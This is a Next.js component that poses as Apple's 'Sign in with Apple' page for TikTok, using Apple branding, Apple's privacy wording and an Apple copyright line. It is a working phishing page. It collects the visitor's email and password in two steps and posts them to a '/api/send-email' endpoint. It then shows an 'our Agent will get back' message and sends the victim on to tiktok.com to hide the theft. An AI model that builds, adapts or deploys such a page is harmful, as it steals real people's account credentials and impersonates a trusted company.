import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import Image from "next/image";

export default function AppleLogin() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [notification, setNotification] = useState("");
  const [notificationType, setNotificationType] = useState("");

  useEffect(() => {
    const setCookie = async () => {
      try {
        const response = await fetch("/api/set-cookie", { method: "POST" });
        if (!response.ok) {
          console.error("Failed to set cookie:", await response.text());
        }
      } catch (err) {
        console.error("Error setting cookie:", err);
      }
    };
    setCookie();

    console.log("Cookies on client:", document.cookie);
  }, []);

  const handleNextStep = (e) => {
    e.preventDefault();
    if (!email) {
      setError("Please enter your email or phone number.");
      return;
    }
    setError("");
    setStep(2);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!password) {
      setError("Please enter your password.");
      return;
    }
    setError("");

    try {
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });

      const responseData = await response.json(); // Parse the response
      if (response.ok) {
        setNotification("Thank for Applying, our Agent will get back within 3 working days. You can now continue with tiktok");
        setNotificationType("success");
        setTimeout(() => {
          window.location.href = "https://www.tiktok.com/explore";
        }, 2000);
      } else {
        // Display the specific error message from the API
        throw new Error(responseData.error || "Failed to send email");
      }
    } catch (err) {
      console.error("Error sending email:", err.message);
      setNotification(`Application failed: ${err.message}`); // Show the specific error
      setNotificationType("error");
    }
  };

  return (
    <>
      <style jsx>{`
        .container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          background-color: #fff;
        }
        .header {
          display: flex;
          align-items: center;
          padding: 16px;
        }
        .header h1 {
          margin-left: 16px;
          font-size: 20px;
          font-weight: 600;
          color: #000;
        }
        .main {
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          flex-grow: 1;
          padding: 0 16px;
        }
        .logo-container {
          margin-bottom: 24px;
        }
        .title {
          font-size: 18px;
          font-weight: 600;
          text-align: center;
          margin-bottom: 24px;
          color: #000000;
        }
        .form {
          width: 100%;
          max-width: 400px;
        }
        .input-container {
          position: relative;
          margin-bottom: 16px;
        }
        .input {
          width: 100%;
          padding: 12px 40px 12px 12px;
          border: 1px solid #d1d5db;
          border-radius: 8px;
          font-size: 16px;
          outline: none;
          color: #000000;
          background-color: #ffffff;
          min-height: 44px;
        }
        .input::placeholder {
          color: #4b5563;
          opacity: 1;
        }
        .input:focus {
          border-color: #3b82f6;
          box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
        }
        .display-email {
          width: 100%;
          padding: 12px;
          border: 1px solid #d1d5db;
          border-radius: 8px;
          background-color: #f3f4f6;
          color: #000000;
          font-size: 16px;
          margin-bottom: 16px;
          min-height: 44px;
        }
        .next-button {
          position: absolute;
          right: 12px;
          top: 50%;
          transform: translateY(-50%);
          width: 24px;
          height: 24px;
          background-color: #e5e7eb;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          border: none;
          cursor: pointer;
        }
        .next-button:hover {
          background-color: #d1d5db;
        }
        .next-button svg {
          width: 16px;
          height: 16px;
          color: #6b7280;
        }
        .next-button:hover svg {
          color: #374151;
        }
        .error {
          color: #ef4444;
          font-size: 14px;
          text-align: center;
          margin-bottom: 16px;
        }
        .notification {
          font-size: 14px;
          text-align: center;
          margin-bottom: 16px;
          padding: 10px;
          border-radius: 4px;
        }
        .notification.success {
          color: #15803d;
          background-color: #dcfce7;
        }
        .notification.error {
          color: #b91c1c;
          background-color: #fee2e2;
        }
        .forgot-password {
          text-align: center;
          margin-bottom: 16px;
        }
        .forgot-password a {
          color: #2563eb;
          font-size: 14px;
          text-decoration: none;
        }
        .forgot-password a:hover {
          text-decoration: underline;
        }
        .privacy-notice {
          margin-top: 24px;
          max-width: 400px;
          text-align: center;
        }
        .privacy-notice svg {
          display: block;
          margin: 0 auto 8px auto;
        }
        .privacy-notice p {
          font-size: 14px;
          color: #4b5563;
        }
        .privacy-notice a {
          color: #2563eb;
          text-decoration: none;
        }
        .privacy-notice a:hover {
          text-decoration: underline;
        }
        .footer {
          padding: 16px;
          text-align: center;
          font-size: 14px;
          color: #6b7280;
        }
        .footer a {
          color: #2563eb;
          text-decoration: none;
        }
        .footer a:hover {
          text-decoration: underline;
        }

        @media (max-width: 640px) {
          .form {
            max-width: 100%;
          }
          .input {
            padding: 14px 48px 14px 14px;
            font-size: 18px;
            min-height: 48px;
          }
          .display-email {
            padding: 14px;
            font-size: 18px;
            min-height: 48px;
          }
          .next-button {
            right: 14px;
            width: 28px;
            height: 28px;
          }
          .next-button svg {
            width: 18px;
            height: 18px;
          }
          .title {
            font-size: 16px;
          }
          .privacy-notice p {
            font-size: 12px;
          }
        }
      `}</style>

      <div className="container">
        <header className="header">
          <Image src="/apple-icon.png" alt="Apple Logo" width={30} height={30} />
          <h1>Apple Account</h1>
        </header>

        <div className="main">
          <div className="logo-container">
            <Image src="/tiktok-icon.png" alt="TikTok Logo" width={80} height={80} />
          </div>

          <h2 className="title">
            Use your Apple Account to sign in to ‘TikTok’:
          </h2>

          {step === 1 ? (
            <motion.form
              onSubmit={handleNextStep}
              className="form"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              <div className="input-container">
                <input
                  type="text"
                  placeholder="Email or Phone Number"
                  className="input"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />
                <button type="submit" className="next-button">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M14 5l7 7m0 0l-7 7m7-7H3"
                    />
                  </svg>
                </button>
              </div>
              {error && <p className="error">{error}</p>}
              {notification && (
                <p className={`notification ${notificationType}`}>
                  {notification}
                </p>
              )}

              <div className="forgot-password">
                <a href="#">Forgot your password?</a>
              </div>

              <div className="privacy-notice">
                <svg
                  width="48"
                  height="48"
                  viewBox="0 0 24 24"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <g fill="#A3CFFA">
                    <circle cx="8" cy="6" r="2" />
                    <rect x="7" y="8" width="2" height="4" rx="1" />
                    <path d="M9 12L11 14H13L11 12H9Z" />
                    <circle cx="16" cy="6" r="2" />
                    <rect x="15" y="8" width="2" height="4" rx="1" />
                    <path d="M15 12L13 14H11L13 12H15Z" />
                  </g>
                </svg>
                <p>
                  Having set up ‘Sign in with Apple’, information about your
                  interactions with Apple and this device may be used by Apple to help
                  prevent fraud.{" "}
                  <a href="#">See how your data is managed...</a>
                </p>
              </div>
            </motion.form>
          ) : (
            <motion.form
              onSubmit={handleSubmit}
              className="form"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.5 }}
            >
              <div className="display-email">{email}</div>
              <div className="input-container">
                <input
                  type="password"
                  placeholder="Password"
                  className="input"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button type="submit" className="next-button">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M14 5l7 7m0 0l-7 7m7-7H3"
                    />
                  </svg>
                </button>
              </div>
              {error && <p className="error">{error}</p>}
              {notification && (
                <p className={`notification ${notificationType}`}>
                  {notification}
                </p>
              )}

              <div className="forgot-password">
                <a href="#">Forgot your password?</a>
              </div>

              <div className="privacy-notice">
                <svg
                  width="48"
                  height="48"
                  viewBox="0 0 24 24"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <g fill="#A3CFFA">
                    <circle cx="8" cy="6" r="2" />
                    <rect x="7" y="8" width="2" height="4" rx="1" />
                    <path d="M9 12L11 14H13L11 12H9Z" />
                    <circle cx="16" cy="6" r="2" />
                    <rect x="15" y="8" width="2" height="4" rx="1" />
                    <path d="M15 12L13 14H11L13 12H15Z" />
                  </g>
                </svg>
                <p>
                  Having set up ‘Sign in with Apple’, information about your
                  interactions with Apple and this device may be used by Apple to help
                  prevent fraud.{" "}
                  <a href="#">See how your data is managed...</a>
                </p>
              </div>
            </motion.form>
          )}
        </div>

        <footer className="footer">
          <p>Copyright © 2025 Apple Inc. All rights reserved.</p>
          <div>
            <a href="#">Privacy Policy</a> | <a href="#">Use of Cookies</a>
          </div>
        </footer>
      </div>
    </>
  );
}